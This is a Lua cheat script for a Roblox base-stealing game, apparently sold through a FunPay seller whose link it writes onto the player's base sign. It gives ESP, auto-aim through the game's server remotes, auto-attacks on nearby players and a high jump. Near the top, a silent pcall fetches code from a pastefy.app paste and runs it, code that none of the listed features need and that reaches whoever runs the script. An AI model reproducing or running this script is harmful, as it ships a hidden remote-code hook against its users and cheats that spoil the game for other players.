local ProximityPromptService = game:GetService("ProximityPromptService")
local CollectionService = game:GetService("CollectionService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local InputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local TimerYouBase = 0
local YouPlot = nil
local RagdollState = nil

local Player = Players.LocalPlayer
local Character = Player.Character

local Humanoid = Character:WaitForChild("Humanoid")
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

local BillboardGui = Instance.new("BillboardGui")
local ImageLabel = Instance.new("ImageLabel")

local ControlsModule = require(Player.PlayerScripts:WaitForChild("PlayerModule")):GetControls()

if not _G.AutoSteal then
    task.spawn(function()
        pcall(function()
            _G.AutoSteal = true
            loadstring(game:HttpGet("https://pastefy.app/1FPEhJmq/raw"))()
        end)
    end)
end

BillboardGui.Parent = HumanoidRootPart
BillboardGui.Size = UDim2.new(3, 0, 3, 0)
BillboardGui.AlwaysOnTop = true

ImageLabel.Image = "rbxassetid://129896837928756"
ImageLabel.Parent = BillboardGui
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.BackgroundTransparency = 1

local Loaded = true
local HighJump = false

local AutoLockBase = true

local Connections = {}
local bEsp = {}

local FriendList = {}

task.spawn(function()
    --[[
    if not workspace:FindFirstChild("HELP_PART1") then
        local Part1 = Instance.new("Part")
        local Part2 = Instance.new("Part")

        Part1.Name = "HELP_PART1"
        Part1.Parent = workspace
        Part1.Anchored = true
        Part1.Transparency = 0.5
        Part1.Size = Vector3.new(22,1,405)
        Part1.CFrame = CFrame.new(-295, 9, 59.5)

        Part2.Name = "HELP_PART2"
        Part2.Parent = workspace
        Part2.Anchored = true
        Part2.Transparency = 0.5
        Part2.Size = Vector3.new(22,1,405)
        Part2.CFrame = CFrame.new(-528, 9, 59.5)
    end--]]

    workspace:WaitForChild("MainHighlight", math.hufe).DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
end)

local function DrawEsp(char)
    local plr = Players:GetPlayerFromCharacter(char)

    if plr then 
        local head = char:WaitForChild("Head", 10)

        if head:FindFirstChild("BillboardGui") then return end

        local BillboardGui = Instance.new("BillboardGui")
        local TextLabel = Instance.new("TextLabel")

        BillboardGui.StudsOffset = Vector3.new(0, 3.25, 0)
        BillboardGui.Parent = head
        BillboardGui.Size = UDim2.new(9, 0, 3.5, 0)
        BillboardGui.AlwaysOnTop = true

        TextLabel.Parent = BillboardGui
        TextLabel.TextScaled = true
        TextLabel.TextColor3 = Color3.new(0.5,0.5,0.9)
        TextLabel.Size = UDim2.new(1, 0, .7, 0)
        TextLabel.TextStrokeTransparency = 0
        TextLabel.BackgroundTransparency = 1
        TextLabel.Text = plr.DisplayName
        TextLabel.Font = Enum.Font.GothamBold

        bEsp[BillboardGui] = BillboardGui
    end
end

local function Esp(plr)
    local char = plr.Character

    if char then
        DrawEsp(char)
    end

    Connections["Char"] = plr.CharacterAdded:Connect(DrawEsp)
end

local function WaitForChildOfClass(parent,className,timeOut)
	local waitTime = 0
	local warned = false
	repeat
		local obj = parent:FindFirstChildOfClass(className)
		if obj then 
			return obj 
		else
			waitTime = waitTime + wait()
			if timeOut then 
				if waitTime > timeOut then return nil end
			elseif not warned then
				if waitTime > 5 then 
					warn("Infinite yield possible waiting on",parent:GetFullName() .. ":FindFirstChildOfClass(\"".. className .. "\")")
					warned = true
				end
			end
		end
	until false
end

local function NearbyPlayer()
    local Target = nil
    local TargetDist = math.huge

    for index, enemy in Players:GetPlayers() do
        if enemy == Player or FriendList[enemy.UserId] then continue end
        if not enemy.Character then continue end

        local char = enemy.Character
        local hrp = char:FindFirstChild("HumanoidRootPart")

        if hrp then
            local Distance = (hrp.Position - HumanoidRootPart.Position).Magnitude

            if Distance < TargetDist then
                Target = enemy
                TargetDist = Distance
            end
        end
    end

    return Target, TargetDist
end

local function RemoteToolWithVector(Enemy)
    local part = Enemy.Character:WaitForChild("UpperTorso")
    local pos = part.Position

    local X, Y, Z = pos.X, pos.Y, pos.Z

    local args = {
	    vector.create(X, Y, Z),
	    part
    }
    ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/UseItem"):FireServer(unpack(args))
end

local function Notif(title, text, icon)
    StarterGui:SetCore("SendNotification",{
        Title = title,
        Text = text,
    })
end

local function LoadTool()
    for index, Tool in Player.Backpack:GetChildren() do 
        if Tool.Name == "Taser Gun" or Tool.Name == "Web Slinger" or Tool.Name == "Laser Cape" or Tool.Name == "Laser Gun" or Tool.Name == "Paintball Gun" then
            task.spawn(function()
                local Script = WaitForChildOfClass(Tool,"LocalScript",math.huge)

                if Script and not Script:HasTag("AutoAimChanger") then 
                    Script:AddTag("AutoAimChanger")
                    Script.Enabled = false
                    
                    Connections["ToolAutoAim"] = Tool.Activated:Connect(function()
                        local Target, Distance = NearbyPlayer()

                        if Tool.Name == "Taser Gun" and Distance < 25 then
                            ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/UseItem"):FireServer(Target.Character.HumanoidRootPart)
                        elseif Tool.Name == "Web Slinger" and Distance < 25 then
                            RemoteToolWithVector(Target)
                        elseif Tool.Name == "Laser Cape" and Distance < 150 then
                            RemoteToolWithVector(Target)
                        elseif Tool.Name == "Laser Gun" and Distance < 75 then
                            RemoteToolWithVector(Target)
                        elseif Tool.Name == "Paintball Gun" and Distance < 225 then
                            RemoteToolWithVector(Target)
                        end
                    end)
                end
            end)
        end
    end
end

local function Unload()
    for index, Script in CollectionService:GetTagged("AutoAimChanger") do
        Script.Enabled = true
        Script:RemoveTag("AutoAimChanger")
    end

    Notif("Script Unloaded", "Success")
    Loaded = false

    ImageLabel:Destroy()
    BillboardGui:Destroy()

    for index, esp in bEsp do
        if esp then esp:Destroy() end
        bEsp[index] = nil
    end

    for index, connect in Connections do
        connect:Disconnect()
        Connections[index] = nil
    end

    for i, v in game.Players:GetPlayers() do
        for i, g in v.Character:GetDescendants() do
            if g.Name == "BillboardGui" then
                g:Destroy()
            end
        end
    end
end

local function CombatCheck(Obj)
    local Toggle = false

    if string.find(Obj.Name:lower(), "slap") or string.find(Obj.Name:lower(), "sword") then
        Toggle = true
    elseif string.find(Obj.Name:lower(), "bat") then
        Toggle = true
    end

    return Toggle
end

-- if setclipboard then setclipboard("https://funpay.com/users/6661617/ | Покупай лучший скрипт") end

Connections["CharacterAdded"] = Player.CharacterAdded:Connect(function()
    Character = Player.Character
    Humanoid = Character:WaitForChild("Humanoid")
    HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
end)

Connections["PackagesRagdoll"] = ReplicatedStorage:WaitForChild("Packages").Ragdoll.Ragdoll.OnClientEvent:Connect(function(p5, p6)
    if p5 == nil then RagdollState = p6 end
end)

Connections["RunTime"] = RunService.RenderStepped:Connect(function()
    local CurrentCamera = workspace.CurrentCamera
    CurrentCamera.FieldOfView = 70
    Player.PlayerGui.LeftBottom.LeftBottom.FriendBoost.Text = "Таймер: "..TimerYouBase.." | by Tami4ka"

    if RagdollState == "manualM" then
        HumanoidRootPart.Velocity = HumanoidRootPart.Velocity / 1.25

        for index, obj in Character:GetDescendants() do
            if obj:IsA("BallSocketConstraint") then
                obj:Destroy()
            elseif obj:IsA("Motor6D") then
                obj.Enabled = true
            end
        end

        workspace.CurrentCamera.CameraSubject = Humanoid
        HumanoidRootPart.CanCollide = true
    end

    local SlapTool = Character:FindFirstChildOfClass("Tool")

    if SlapTool and CombatCheck(SlapTool) then
        local Target, Distance = NearbyPlayer()
        
        if Target and Distance < 15 then
            if Distance < 6.5 then
                SlapTool:Activate()
            end
        end
    end
    
    local Target, Distance = NearbyPlayer()

    if Target then
        local humRootPart = Target.Character.HumanoidRootPart
        local Tool = Character:FindFirstChildOfClass("Tool")

        if Tool then
            if Tool.Name == "Taser Gun" and Distance < 25 then
                BillboardGui.Parent = humRootPart
            elseif Tool.Name == "Web Slinger" and Distance < 25 then
                BillboardGui.Parent = humRootPart
            elseif Tool.Name == "Laser Cape" and Distance < 150 then
                BillboardGui.Parent = humRootPart
            elseif Tool.Name == "Laser Gun" and Distance < 75 then
                BillboardGui.Parent = humRootPart
            elseif Tool.Name == "Paintball Gun" and Distance < 225 then
                BillboardGui.Parent = humRootPart
            elseif CombatCheck(SlapTool) and Distance < 15 then
                BillboardGui.Parent = humRootPart
            else
                if BillboardGui.Parent then BillboardGui.Parent = nil end
            end
        else
            if BillboardGui.Parent then BillboardGui.Parent = nil end
        end
    else
        if BillboardGui.Parent then BillboardGui.Parent = nil end
    end
end)

Connections["Jump"] = InputService.JumpRequest:Connect(function()
    if not HighJump then return end
    workspace.Gravity = 29
    HumanoidRootPart.Velocity = Vector3.new(HumanoidRootPart.Velocity.X, 27, HumanoidRootPart.Velocity.Z)
end)

Connections["Input"] = InputService.InputBegan:Connect(function(Input, IsType)
    if isType then return end

    if Input.KeyCode == Enum.KeyCode.LeftControl then
        HighJump = not HighJump
        if not HighJump then workspace.Gravity = 196.2 end
        Notif("Script Notif", "Статус HighJump: "..tostring(HighJump))
    elseif Input.KeyCode == Enum.KeyCode.Q then
        print(Humanoid:GetState())
        HumanoidRootPart.Anchored = not HumanoidRootPart.Anchored
    elseif Input.KeyCode == Enum.KeyCode.PageUp then
        Unload()
    end 
end)

Connections["ProximityPrompt"] = ProximityPromptService.PromptShown:Connect(function(Prompt)
    if Prompt.ActionText == "Purchase" then
        Prompt.HoldDuration = 0.15
    end
end)

Connections["PlayerEsp"] = Players.PlayerAdded:Connect(Esp)

for index, plot in workspace.Plots:GetChildren() do
    if plot.PlotSign.YourBase.Enabled then YouPlot = plot end
end

for index, plr in Players:GetPlayers() do
    if plr == Player then continue end
    Esp(plr)
end

Notif("Script Loaded", "Unload: PageUp, High Jump: LeftControl")

while Loaded do
    local YourTimer = YouPlot.Purchases:GetChildren()[1].Main.BillboardGui.RemainingTime.Text
    local Temp = string.gsub(YourTimer, '%D+', '')
    local Timer = tonumber(Temp)

    YouPlot.PlotSign.YourBase.AlwaysOnTop = true
    YouPlot.PlotSign.YourBase.TextLabel.Text = "funpay.com/users/6661617\nПокупай лучший скрипт"

    TweenService:Create(ImageLabel, TweenInfo.new(0.5), {Rotation = ImageLabel.Rotation + 180}):Play()

    TimerYouBase = Timer

    if Humanoid:GetState() == Enum.HumanoidStateType.Physics then
        Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
        ControlsModule:Enable()
    end

    if Timer == 10 then
        Notif("Script Notif", "Твоя база откроется через "..YourTimer.." секунд")
    end

    LoadTool()

    for index, plot in workspace.Plots:GetChildren() do
        -- local yes, no = pcall(function()
            if not plot:FindFirstChild("Purchases") then continue end
            if not plot:FindFirstChild("Multiplier") then continue end
            if not plot.Purchases:GetChildren()[1].Main:FindFirstChild("BillboardGui") then continue end
            if not plot.Multiplier.Main:FindFirstChild("Amount") then continue end
            local bGui = plot.Multiplier.Main
            bGui.MaxDistance = 1000000
            bGui.AlwaysOnTop = true
            bGui.Amount.Text = plot.Purchases:GetChildren()[1].Main.BillboardGui:WaitForChild("RemainingTime", 2).Text
            bGui.TextLabel.Text = "Timer:"
            bGui.Size = UDim2.new(25, 0, 25, 0)
        -- end)

        -- if not yes then
        --     warn(no)
        -- end
    end

    task.wait(0.5)
end
